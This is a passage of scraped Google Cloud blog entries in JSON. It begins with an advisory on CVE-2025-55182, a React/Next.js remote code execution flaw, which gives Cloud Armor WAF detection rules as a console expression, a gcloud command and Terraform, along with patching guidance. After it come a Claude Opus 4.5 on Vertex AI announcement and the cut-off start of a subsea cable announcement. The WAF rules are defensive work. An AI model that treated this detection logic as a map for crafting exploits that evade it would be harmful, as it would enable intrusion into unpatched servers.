style=\"vertical-align: baseline;\">For customers using </span><a href=\"https://firebase.google.com/products/hosting\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Firebase Hosting</strong></a><span style=\"vertical-align: baseline;\"> or </span><a href=\"https://firebase.google.com/products/app-hosting\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Firebase App Hosting</strong></a><span style=\"vertical-align: baseline;\">, a rule is already enforced to limit exploitation of CVE-2025-55182 through requests to custom and default domains. All other workloads require customer intervention and patching for impacted packages.</span></p>\n<p><span><span style=\"vertical-align: baseline;\">For </span><a href=\"https://support.projectshield.google/s/article/Protecting-Your-Website-From-Known-Vulnerabilities\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Project Shield</strong></a><span style=\"vertical-align: baseline;\"> users, we have deployed WAF protections for all sites and no action is necessary to enable these WAF rules. For long-term mitigation, you will need to patch your origin servers as an essential step to eliminate the vulnerability (see additional guidance below).</span></span></p>\n<p><span style=\"vertical-align: baseline;\">Cloud Armor and the Application Load Balancer can be used to deliver and protect your applications and services regardless of whether they are deployed on Google Cloud, on-premises, or on another infrastructure provider. If you are not yet using Cloud Armor and the Application Load Balancer, please follow the guidance further down to get started.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Deploying the cve-canary WAF rule for Cloud Armor</span></h3>\n<p><span style=\"vertical-align: baseline;\">To configure Cloud Armor to detect and protect from CVE-2025-55182, you can use the </span><a href=\"https://docs.cloud.google.com/armor/docs/waf-rules#cves_and_other_vulnerabilities\"><code style=\"text-decoration: underline; vertical-align: baseline;\">cve-canary</code><span style=\"text-decoration: underline; vertical-align: baseline;\"> preconfigured WAF rule</span></a><span style=\"vertical-align: baseline;\"> leveraging the new ruleID that we have added for this vulnerability. </span></p>\n<p><span style=\"vertical-align: baseline;\">In your Cloud Armor backend security policy, create a new rule and configure the following match condition:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &quot;(has(request.headers[&#x27;next-action&#x27;]) || has(request.headers[&#x27;rsc-action-id&#x27;]) || request.headers[&#x27;content-type&#x27;].contains(&#x27;multipart/form-data&#x27;) || request.headers[&#x27;content-type&#x27;].contains(&#x27;application/x-www-form-urlencoded&#x27;)) &amp;&amp; evaluatePreconfiguredWaf(&#x27;cve-canary&#x27;,{&#x27;sensitivity&#x27;: 0, &#x27;opt_in_rule_ids&#x27;: [&#x27;google-mrs-v202512-id000001-rce&#x27;,&#x27;google-mrs-v202512-id000002-rce&#x27;]})&quot;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f12ebc84550&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">This can be accomplished from the Google Cloud console by navigating to Cloud Armor and modifying an existing or creating a new policy.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--medium\n      \n      \n        h-c-grid__col\n        \n        h-c-grid__col--4 h-c-grid__col--offset-4\n        \n      \">\n\n      \n      \n        \n        <img alt=\"20251205_11am_rule (1)\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/20251205_11am_rule_1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Cloud Armor rule creation in the Google Cloud console.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p>Alternatively, the gcloud CLI can be used to create or modify a policy with the requisite rule:</p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;gcloud compute security-policies rules create PRIORITY_NUMBER \\\\\\r\\n    --security-policy SECURITY_POLICY_NAME \\\\\\r\\n    --expression &quot;(has(request.headers[\\&#x27;next-action\\&#x27;]) || has(request.headers[\\&#x27;rsc-action-id\\&#x27;]) || request.headers[\\&#x27;content-type\\&#x27;].contains(\\&#x27;multipart/form-data\\&#x27;) || request.headers[\\&#x27;content-type\\&#x27;].contains(\\&#x27;application/x-www-form-urlencoded\\&#x27;)) &amp;&amp; evaluatePreconfiguredWaf(\\&#x27;cve-canary\\&#x27;,{\\&#x27;sensitivity\\&#x27;: 0, \\&#x27;opt_in_rule_ids\\&#x27;: [\\&#x27;google-mrs-v202512-id000001-rce\\&#x27;,\\&#x27;google-mrs-v202512-id000002-rce\\&#x27;]})&quot; \\\\\\r\\n    --action=deny-403&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f12ebc845b0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Additionally, if you are managing your rules with Terraform, you may implement the rule via the following syntax:</span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;rule {\\r\\n    action   = &quot;deny(403)&quot;\\r\\n    priority = &quot;PRIORITY_NUMBER&quot;\\r\\n    match {\\r\\n      expr {\\r\\n        expression = &quot;(has(request.headers[\\&#x27;next-action\\&#x27;]) || has(request.headers[\\&#x27;rsc-action-id\\&#x27;]) || request.headers[\\&#x27;content-type\\&#x27;].contains(\\&#x27;multipart/form-data\\&#x27;) || request.headers[\\&#x27;content-type\\&#x27;].contains(\\&#x27;application/x-www-form-urlencoded\\&#x27;)) &amp;&amp; evaluatePreconfiguredWaf(\\&#x27;cve-canary\\&#x27;,{\\&#x27;sensitivity\\&#x27;: 0, \\&#x27;opt_in_rule_ids\\&#x27;: [\\&#x27;google-mrs-v202512-id000001-rce\\&#x27;,\\&#x27;google-mrs-v202512-id000002-rce\\&#x27;]})&quot;\\r\\n      }\\r\\n    }\\r\\n    description = &quot;Applies protection for CVE-2025-55182 (React/Next.JS)&quot;\\r\\n  }&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f12ebc84610&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Verifying WAF rule safety for your application and consuming telemetry</span></h3>\n<p><span style=\"vertical-align: baseline;\">Cloud Armor rules can be </span><a href=\"https://docs.cloud.google.com/armor/docs/security-policy-overview#preview_mode\"><span style=\"text-decoration: underline; vertical-align: baseline;\">configured in preview mode</span></a><span style=\"vertical-align: baseline;\">, a logging-only mode to test or monitor the expected impact of the rule without Cloud Armor enforcing the configured action. We recommend that the new rule described above first be deployed in preview mode in your production environments so that you can see what traffic it would block. </span></p>\n<p><span style=\"vertical-align: baseline;\">Once you verify that the new rule is behaving as desired in your environment, then you can disable preview mode to allow Cloud Armor to actively enforce it.</span></p>\n<p><span style=\"vertical-align: baseline;\">Cloud Armor per-request WAF logs are emitted as part of the Application Load Balancer logs to Cloud Logging. To see what Cloud Armor’s decision was on every request, load balancer logging first </span><a href=\"https://docs.cloud.google.com/load-balancing/docs/https/https-logging-monitoring\"><span style=\"text-decoration: underline; vertical-align: baseline;\">needs to be enabled on a per backend service basis</span></a><span style=\"vertical-align: baseline;\">. Once it is enabled, all subsequent Cloud Armor decisions will be logged and can be found in Cloud Logging by </span><a href=\"https://docs.cloud.google.com/armor/docs/request-logging\"><span style=\"text-decoration: underline; vertical-align: baseline;\">following these instructions</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Interaction of Cloud Armor rules with </span><span style=\"vertical-align: baseline;\">vulnerability</span><span style=\"vertical-align: baseline;\"> scanning tools</span></h3>\n<p><span style=\"vertical-align: baseline;\">There has been a proliferation of scanning tools designed to help identify vulnerable instances of React and Next.js in your environments. Many of those scanners are designed to identify the version number of relevant frameworks in your servers and do so by crafting a </span><span style=\"vertical-align: baseline;\">legitimate</span><span style=\"vertical-align: baseline;\"> query and inspecting the response from the server to detect the version of React and </span><span style=\"vertical-align: baseline;\">Next.js</span><span style=\"vertical-align: baseline;\"> that is running. </span></p>\n<p><span style=\"vertical-align: baseline;\">Our WAF rule is designed to detect and prevent exploit attempts of </span><span style=\"vertical-align: baseline;\">CVE-2025-55182</span><span style=\"vertical-align: baseline;\">. As the scanners discussed above are not attempting an exploit, but sending a safe query to </span><span style=\"vertical-align: baseline;\">elicit</span><span style=\"vertical-align: baseline;\"> a response revealing indications of the version of the software, </span><strong style=\"vertical-align: baseline;\">the above Cloud Armor rule will not detect or block such scanners. </strong></p>\n<p><span style=\"vertical-align: baseline;\">If the findings of these scanners indicate a vulnerable instance of software protected by Cloud Armor, that does not mean that an actual exploit attempt of the vulnerability will successfully get through your Cloud Armor security policy. Instead, such findings mean that the version React or Next.js detected is known to be vulnerable and should be patched.</span></p>\n<h3><span style=\"vertical-align: baseline;\">How to get started with Cloud Armor for new users</span></h3>\n<p><span style=\"vertical-align: baseline;\">If your workload is already using an Application Load Balancer to receive traffic from the internet, you can configure Cloud Armor to protect your workload from this and other application-level vulnerabilities (as well as DDoS attacks) by following </span><a href=\"https://docs.cloud.google.com/armor/docs/configure-security-policies\"><span style=\"text-decoration: underline; vertical-align: baseline;\">these instructions</span></a><span style=\"vertical-align: baseline;\">. </span></p>\n<p><span style=\"vertical-align: baseline;\">If you are not yet using an Application Load Balancer and Cloud Armor, you can get started with the </span><a href=\"https://docs.cloud.google.com/load-balancing/docs/https\"><span style=\"text-decoration: underline; vertical-align: baseline;\">external Application Load Balancer overview</span></a><span style=\"vertical-align: baseline;\">, the </span><a href=\"https://docs.cloud.google.com/armor/docs/security-policy-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Armor overview</span></a><span style=\"vertical-align: baseline;\">, and the </span><a href=\"https://docs.cloud.google.com/armor/docs/best-practices\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Armor best practices</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<p><span style=\"vertical-align: baseline;\">If your workload is using </span><a href=\"http://docs.cloud.google.com/run/\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Run</span></a><span style=\"vertical-align: baseline;\">, </span><a href=\"https://cloud.google.com/functions\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Run functions</span></a><span style=\"vertical-align: baseline;\">, or </span><a href=\"https://cloud.google.com/appengine\"><span style=\"text-decoration: underline; vertical-align: baseline;\">App Engine</span></a><span style=\"vertical-align: baseline;\"> and receives traffic from the internet, you must first </span><a href=\"https://docs.cloud.google.com/load-balancing/docs/https/setup-global-ext-https-serverless\"><span style=\"text-decoration: underline; vertical-align: baseline;\">set up an Application Load Balancer in front of your endpoint</span></a><span style=\"vertical-align: baseline;\"> to leverage Cloud Armor security policies to protect your workload. You will then need to </span><a href=\"https://docs.cloud.google.com/armor/docs/integrating-cloud-armor#serverless\"><span style=\"text-decoration: underline; vertical-align: baseline;\">configure the appropriate controls</span></a><span style=\"vertical-align: baseline;\"> to ensure that Cloud Armor and the Application Load Balancer can’t be bypassed.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Best practices and additional risk mitigations</span></h3>\n<p><span style=\"vertical-align: baseline;\">Once you configure Cloud Armor, we recommend consulting our </span><a href=\"https://docs.cloud.google.com/armor/docs/best-practices\"><span style=\"text-decoration: underline; vertical-align: baseline;\">best practices guide</span></a><span style=\"vertical-align: baseline;\">. Be sure to account for </span><a href=\"https://docs.cloud.google.com/armor/docs/security-policy-overview#limitations\"><span style=\"text-decoration: underline; vertical-align: baseline;\">limitations</span></a><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">discussed in the documentation to minimize risk and optimize performance while ensuring the safety and availability of your workloads. </span></p>\n<h3><span style=\"vertical-align: baseline;\">Long-term mitigation: Mandatory framework update and redeployment</span></h3>\n<p><span style=\"vertical-align: baseline;\">While WAF rules provide critical frontline defense, the most comprehensive long-term solution is to patch the underlying frameworks.</span></p>\n<p><strong style=\"vertical-align: baseline;\">We urge all customers running React and Next.js applications on Google Cloud to immediately update their dependencies to the latest stable versions (React 19.2.1 or the relevant version of Next.js listed </strong><a href=\"https://nextjs.org/blog/CVE-2025-66478#required-action\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">here</strong></a><strong style=\"vertical-align: baseline;\">), and redeploy their services.</strong></p>\n<p><span style=\"vertical-align: baseline;\">This applies specifically to applications deployed on:</span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Cloud Run, Cloud Run functions, or App Engine</strong><span style=\"vertical-align: baseline;\">: Update your application dependencies with the updated framework versions and redeploy.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Google Kubernetes Engine (GKE)</strong><span style=\"vertical-align: baseline;\">: Update your container images with the latest framework versions and redeploy your pods.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Compute Engine</strong><span style=\"vertical-align: baseline;\">:</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">The public OS images provided by Google Cloud do not have React or Next.js packages installed by default. If you have installed a custom OS with the affected packages, update your workloads to include the latest framework versions and enable WAF rules in front of all workloads.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Firebase</strong><span style=\"vertical-align: baseline;\">:</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">If you’re using Cloud Functions for Firebase, Firebase Hosting, or Firebase App Hosting, update your application dependencies with the updated framework versions and redeploy. Firebase Hosting and App Hosting are also automatically enforcing a rule to limit exploitation of CVE-2025-55182 through requests to custom and default domains.</span></li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">Patching your applications is an essential step to eliminate the vulnerability at its source and ensure the continued integrity and security of your services.</span></p>\n<p><span style=\"vertical-align: baseline;\">We will continue to monitor the situation closely and provide further updates and guidance as necessary. Please refer to our official </span><a href=\"https://docs.cloud.google.com/support/bulletins#gcp-2025-072\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Security advisories</span></a><span style=\"vertical-align: baseline;\"> for the most current information and detailed steps.</span></p></div>",
        "published_date": "2025-12-03 23:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/ai-machine-learning/claude-opus-4-5-on-vertex-ai/",
        "title": "Announcing Claude Opus 4.5 on Vertex AI",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/112125a_HF1385_Social_Anthropic_Opus_4.5_v1c.max-600x600.jpg",
        "author": "Michael Gerstenhaber",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Today, we’re excited to announce that Anthropic’s newest model, </span><a href=\"https://console.cloud.google.com/vertex-ai/publishers/anthropic/model-garden/claude-opus-4-5\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Claude Opus 4.5</strong></a><span style=\"vertical-align: baseline;\">, is generally available on Vertex AI. As </span><a href=\"https://www.anthropic.com/news/claude-opus-4-5\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Anthropic’s most advanced model to date</span></a><span style=\"vertical-align: baseline;\">, it excels in coding, agents, vision, computer use and office tasks — at one-third the cost of its predecessor, Opus 4.1.</span></p>\n<p><span style=\"vertical-align: baseline;\">We remain committed to providing Vertex AI customers with even more model choice, a core tenet of our platform. This new model adds to the latest Claude Sonnet 4.5 and Claude Haiku 4.5 models already available on Vertex AI. For customers already building with Claude Sonnet 4.5, Opus 4.5 serves as an upgrade delivering frontier performance across existing use cases. </span></p>\n<p><span style=\"vertical-align: baseline;\">When building with Opus 4.5 on Vertex AI, you get a unified AI development platform to quickly build, deploy, and operationalize your AI applications and agents — backed by Google Cloud’s reliable and high performance infrastructure, secure-by-default platform controls and advanced AI protection, and Agent Builder stack.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">How Opus 4.5 helps businesses — from complex coding to more capable agents </strong></h3>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Agentic tool use</strong><span style=\"vertical-align: baseline;\">: The model, paired with Anthropic’s next wave of tool use improvements, enables more capable agents with new behaviors. For example, tool search lets agents dynamically discover from hundreds of tools without context window bloat. </span></li>\n<li><strong style=\"vertical-align: baseline;\">Coding: </strong><span style=\"vertical-align: baseline;\">The model can turn multi-day development projects into hours-long tasks, working independently with broader language support and enhanced behaviors like more efficient code, better test coverage, and cleaner architecture choices.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Office task agents: </strong><span style=\"vertical-align: baseline;\">The model has improved memory to maintain context and consistency across files, alongside a step-change improvement in creating spreadsheets, slides, and docs. </span></li>\n<li><strong style=\"vertical-align: baseline;\">Financial analysis:</strong><span style=\"vertical-align: baseline;\"> The model can connect the dots across complex information systems. This includes regulatory filings, market reports, internal data, making sophisticated predictive modeling and proactive compliance possible.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Cybersecurity:</strong><span style=\"vertical-align: baseline;\"> The model brings professional-grade analysis to security workflows, correlating logs, vulnerability databases, and threat intelligence to support threat detection and incident response.</span></li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">Build on Vertex AI, our unified AI development platform</strong></h3>\n<p><a href=\"https://console.cloud.google.com/vertex-ai/studio/multimodal\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI</span></a><span style=\"vertical-align: baseline;\"> is the trusted, open platform for building, deploying, and scaling differentiated AI applications and agents with unconstrained choice. By combining cutting-edge partner models like Claude Opus 4.5 with our enterprise-grade tooling, you can get the most out of your agents without sacrificing control, safety, or speed. </span></p>\n<ul>\n<li><strong style=\"vertical-align: baseline;\">Get the most out of your agents: </strong><span style=\"vertical-align: baseline;\">Rapidly build, scale, and govern agents using our comprehensive </span><a href=\"https://cloud.google.com/products/agent-builder?utm_source=google&amp;utm_medium=cpc&amp;utm_campaign=na-US-all-en-dr-skws-all-all-trial-b-dr-1710134&amp;utm_content=text-ad-none-any-DEV_c-CRE_772251321546-ADGP_Hybrid+%7C+SKWS+-+BRO+%7C+Txt-AIML-Conversational+AI-Agent+Builder-KWID_302905484362-kwd-302905484362&amp;utm_term=KW_ai+search-ST_ai+search&amp;gclsrc=aw.ds&amp;gad_source=1&amp;gad_campaignid=22980675808&amp;gclid=CjwKCAiAw9vIBhBBEiwAraSATsGA3xoiyHkKW3qLfsEE8H7MAbOdemUXCP8mp_SMaBDQChS5XiIT8xoCY1AQAvD_BwE&amp;e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Builder stack</span></a><span style=\"vertical-align: baseline;\">, which makes it easy to move multi-step workflows from prototype to production with enterprise governance. This stack includes the open Agent Development Kit (ADK), Agent2Agent (A2A) protocol, and the fully managed Agent Engine. </span></li>\n<li><strong style=\"vertical-align: baseline;\">Achieve optimized performance and scale</strong><span style=\"vertical-align: baseline;\">: Remove the burden of provisioning overhead and gain massive scale by running Claude as a Model-as-a-Service on our high-performance infrastructure. You can leverage </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/global-endpoint-for-claude-models-generally-available-on-vertex-ai?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">the global endpoint for Claude</span></a><span style=\"vertical-align: baseline;\"> for enhanced availability and reduced latency, or reserve dedicated capacity and prioritized processing for your Claude workloads at a fixed cost with provisioned throughput.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Improve performance and reduce costs:</strong><span style=\"vertical-align: baseline;\"> In Vertex AI, you’ll have access to Claude-supported features that help improve performance while reducing cost, including </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/partner-models/claude/prompt-caching\"><span style=\"text-decoration: underline; vertical-align: baseline;\">prompt caching</span></a><span style=\"vertical-align: baseline;\"> with flexible Time To Live (TTL) up to one hour, efficient </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/partner-models/claude/batch\"><span style=\"text-decoration: underline; vertical-align: baseline;\">batch predictions</span></a><span style=\"vertical-align: baseline;\">, a 1M token context window, and </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/partner-models/claude/web-search\"><span style=\"text-decoration: underline; vertical-align: baseline;\">web search (preview)</span></a><span style=\"vertical-align: baseline;\">. </span></li>\n<li><strong style=\"vertical-align: baseline;\">Deploy with confidence:</strong><span style=\"vertical-align: baseline;\"> Deploy AI workloads confidently, backed by our secure-by-default platform and advanced threat protection. Utilize Google Cloud’s foundational security, data residency, and governance controls, and get advanced </span><a href=\"https://cloud.google.com/security/securing-ai\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI Protection</span></a><span style=\"vertical-align: baseline;\"> in </span><a href=\"https://cloud.google.com/security/products/security-command-center\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Security Command Center</span></a><span style=\"vertical-align: baseline;\">. Protect against novel AI and agentic threats like prompt injection and tool poisoning with </span><a href=\"https://cloud.google.com/security/products/model-armor?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Model Armor</span></a><span style=\"vertical-align: baseline;\">.</span></li>\n</ul>\n<p><strong style=\"vertical-align: baseline;\">Customers driving impact with Claude on Vertex AI</strong></p>\n<p><a href=\"https://cloud.google.com/customers/augment\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Augment Code</strong></a><span style=\"vertical-align: baseline;\"> is using Claude on Vertex AI to power its AI coding assistant, which helps developers navigate and contribute to production-grade codebases.</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">“What we're able to get out of Claude is truly extraordinary, but all of the work we've done to deliver knowledge of customer code, used in conjunction with Claude and the other models we host on Google Cloud, is what makes our product so powerful.” </span><strong style=\"font-style: italic; vertical-align: baseline;\">- Scott Dietzen, CEO, Augment Code</strong></p>\n<p><a href=\"https://cloud.google.com/customers/palo-alto-networks?e=48754805\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Palo Alto Networks</strong></a><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">speeds up feature development and code implementation by 20% to 30% with Claude on Vertex AI.</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">“With Claude running on Vertex AI, we saw a 20% to 30% increase in code development velocity. Running Claude on Google Cloud’s Vertex AI not only accelerates development projects, it enables us to hardwire security into code before it ships.” </span><strong style=\"font-style: italic; vertical-align: baseline;\">- Gunjan Patel, Director of Engineering, Office of the CPO, Palo Alto Networks.</strong></p>\n<p><a href=\"https://cloud.google.com/customers/replit\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Replit</strong></a><strong style=\"font-style: italic; vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">leverages Claude on Vertex AI to power </span><a href=\"https://docs.replit.com/replitai/agent\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Replit Agent</span></a><span style=\"vertical-align: baseline;\">, which empowers people across the world to use natural language prompts to turn their ideas into applications, regardless of coding experience.</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">“Our AI agent is made more powerful through Anthropic’s Claude models running on Vertex AI. This integration allows us to easily connect with other Google Cloud services, like Cloud Run, to work together behind the scenes to help customers turn their ideas into apps.”</span><strong style=\"font-style: italic; vertical-align: baseline;\"> - Amjad Masad, Founder and CEO, Replit</strong></p>\n<p><a href=\"https://cloud.google.com/customers/telusai\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">TELUS</strong></a><span style=\"vertical-align: baseline;\"> built its generative AI platform, Fuel iX™, on Google Cloud to give its team members a choice of curated AI models, like Claude, inspiring engineering excellence and enterprise-wide productivity.</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">“Getting a model as powerful as Claude on Vertex AI is a win-win that makes life so much easier. We get a model that excels at tool calling on a comprehensive platform that integrates with our core Google Cloud workloads like GKE and Cloud Run — that's the magic.”</span><strong style=\"font-style: italic; vertical-align: baseline;\"> - Justin Watts, Distinguished Engineer, TELUS</strong></p>\n<h3><strong style=\"vertical-align: baseline;\">How to get started</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Start building with Claude Opus 4.5 today by following these instructions:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Navigate to the </span><a href=\"https://console.cloud.google.com/vertex-ai/publishers/anthropic/model-garden/claude-opus-4-5\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Claude Opus 4.5 model card</span></a><span style=\"vertical-align: baseline;\"> in the Vertex AI Model Garden, select “Enable”, and follow the proceeding instructions. You can also find and easily procure </span><a href=\"https://console.cloud.google.com/marketplace/product/anthropic/claude-opus-4-5\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Claude Opus 4.5 on Google Cloud Marketplace</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Explore our</span><span style=\"vertical-align: baseline;\"> </span><a href=\"https://github.com/GoogleCloudPlatform/vertex-ai-samples/blob/main/notebooks/official/generative_ai/anthropic_claude_intro.ipynb\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">sample notebook</span></a><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">for help getting started.</span></p>\n</li>\n<li><span style=\"vertical-align: baseline;\">Visit our</span><span style=\"vertical-align: baseline;\"> </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/partner-models/claude/opus-4-5\"><span style=\"text-decoration: underline; vertical-align: baseline;\">documentation</span></a><span style=\"vertical-align: baseline;\"> for pricing and regional support details.</span></li>\n</ol></div>",
        "published_date": "2025-11-24 18:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/infrastructure/talaylink-subsea-cable-to-connect-australia-and-thailand/",
        "title": "Introducing the TalayLink subsea cable and new connectivity hubs",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/image1_tzfiILk.max-600x600.jpg",
        "author": "Bikash Koley",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Today we’re announcing TalayLink, a new subsea cable connecting Australia and Thailand to significantly increase the reach, reliability, and resilience of digital connectivity across Asia Pacific and around the world.</span></p>\n<p><span style=\"vertical-align: baseline;\">Named after the Thai word for sea or ocean, “talay,” TalayLink will extend the interlink cable that we announced as part of the </span><a href=\"https://cloud.google.com/blog/products/infrastructure/bosun-australia-connect-initiative-for-indo-pacific-connectivity\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Australia Connect</span></a><span style=\"vertical-align: baseline;\"> initiative last year. T</span><span style=\"vertical-align: baseline;\">he new subsea cable will establish a new, diverse path to Thailand via the Indian Ocean, west of the Sunda Strait, where many existing subsea cables currently route. </span><span style=\"vertical-align: baseline;\">This strategic routing will </span><span style=\"vertical-align: baseline;\">further integrate our future data centers and cloud region in </span><a href=\"https://www.googlecloudpresscorner.com/2024-09-30-Google-Announces-Plans-to-Invest-US-1-Billion-to-Build-Data-Center-and-Cloud-Region-in-Thailand,-Support-Initiatives-to-Expand-AI-Opportunities-for-Thais\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Thailand</span></a><span style=\"vertical-align: baseline;\"> into our global network. </span></p>\n<p><span style=\"vertical-align: baseline;\">In addition to the TalayLink subsea cable system, we’re announcing plans for new connectivity hubs in Western Australia (Mandurah) and South Thailand. These strategic investments are designed to future-proof regional connectivity and accelerate the delivery of advanced digital and AI services through cable switching, content caching, and colocation capabilities. </span></p>\n<p><span style=\"vertical-align: baseline;\">The Mandurah connectivity hub will establish a diverse landing point from Perth, where the majority of existing subsea cables currently land in Western Australia. In South Thailand, an established crossroads for subsea cables, we are partnering with colocation provider AIS to accelerate our deployment and benefit from existing local infrastructure investments. </span></p></div>\n<div class=\"block-paragraph_advanced\"><p style=\"padding-left: 40px;\"><span style=\"font-style: italic; vertical-align: baseline;\">“The TalayLink cable will serve as a pivotal piece of digital infrastructure, enhancing Thailand’s connectivity and resilience. Together with Google’s upcoming Google Cloud region and data center in Thailand, these forward‑looking investments will significantly expand regional network and computing capacity, while firmly positioning Thailand as a critical digital gateway for next‑generation cloud and AI innovation in Southeast Asia.</span></p>\n<p style=\"padding-left: 40px;\"><span style=\"font-style: italic; vertical-align: baseline;\"><span style=\"font-style: italic; vertical-align: baseline;\">“The Thailand Board of Investment (BOI) is fully committed to supporting Google’s investment in Thailand, fostering the growth of the nation’s digital economy, and advancing digital skills to ensure inclusive and sustainable development.” </span></span><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: baseline;\">- </span></span><span style=\"vertical-align: baseline;\"><strong style=\"vertical-align: baseline;\">Narit Therdsteerasukdi, Secretary General, Thailand Board of Investment (BOI)</strong></span></p>\n<p style=\"padding-left: 40px;\"><span style=\"font-style: italic; vertical-align: baseline;\">“AIS is excited to be extending our relationship with Google as a strategic partner by supporting the connectivity hub in Southern Thailand. The combination of Google’s new, diverse submarine cable path and AIS’s high-reliability colocation capabilities will ensure the digital infrastructure in the region is capable of supporting the country’s AI strategy.” </span><span style=\"vertical-align: baseline;\">- </span><strong style=\"vertical-align: baseline;\">Pratthana Leelapanang Chief Executive Officer, AIS</strong></p>\n<p style=\"padding-left: 40px;\"><span style=\"font-style: italic; vertical-align: baseline;\">“International Gateway Company (IGC), a subsidiary of ALT Telecom PLC, is delighted to be 